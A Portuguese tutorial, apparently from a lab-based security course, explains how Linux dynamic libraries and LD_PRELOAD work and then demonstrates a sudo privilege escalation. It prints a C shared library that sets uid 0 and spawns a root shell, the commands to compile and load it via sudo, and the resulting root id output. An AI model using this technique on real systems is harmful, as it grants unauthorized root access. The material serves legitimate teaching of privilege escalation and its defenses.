No Linux, programas geralmente usam bibliotecas de objetos compartilhados dinamicamente vinculados. Essas bibliotecas contêm código compilado ou dados que evitam a reescrita de código em vários programas.

Existem dois tipos de bibliotecas: estáticas (.a), que se tornam parte do programa ao serem compiladas e não podem ser alteradas, e dinâmicas (.so), que podem ser modificadas para influenciar a execução do programa que as utiliza.

Existem vários métodos para especificar a localização de bibliotecas dinâmicas, para que o sistema saiba onde procurá-las na execução do programa.

Isso inclui os sinalizadores `-rpath` ou `-rpath-link` ao compilar um programa, usar as variáveis ​​de ambiente `LD_RUN_PATH` ou `LD_LIBRARY_PATH`, colocar bibliotecas nos diretórios padrão `/lib` ou `/usr/lib` ou especificar outro diretório contendo as bibliotecas dentro do arquivo de configuração `/etc/ld.so.conf`.

Além disso, a variável de ambiente `LD_PRELOAD` pode carregar uma biblioteca antes de executar um binário. As funções desta biblioteca têm preferência sobre as padrões. Os objetos compartilhados requeridos por um binário podem ser visualizados usando o utilitário `ldd`.

```shell-session
htb_student@NIX02:~$ ldd /bin/ls

	linux-vdso.so.1 =>  (0x00007fff03bc7000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
```

A imagem acima lista todas as bibliotecas necessárias pelo `/bin/ls`, juntamente com seus caminhos absolutos.

## Escalonamento de privilégios LD_PRELOAD

Vamos ver um exemplo de como podemos utilizar a variável de ambiente [LD_PRELOAD](https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) para escalar privilégios. Para isso, precisamos de um usuário com privilégios `sudo`.

```shell-session
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

ste usuário tem direitos para reiniciar o serviço Apache como root, mas como este não é um [GTFOBin](https://gtfobins.github.io/#apache) e a entrada `/etc/sudoers` é escrita especificando o caminho absoluto, isso não poderia ser usado para escalar privilégios em circunstâncias normais.
No entanto, podemos explorar o `LD_PRELOAD`problema para executar um arquivo de biblioteca compartilhada personalizado. Vamos compilar a seguinte biblioteca:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Podemos compilar isso da seguinte forma:
```shell-session
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Por fim, podemos escalar privilégios usando o comando abaixo. Certifique-se de especificar o caminho completo para seu arquivo de biblioteca malicioso.

```shell-session
htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```













































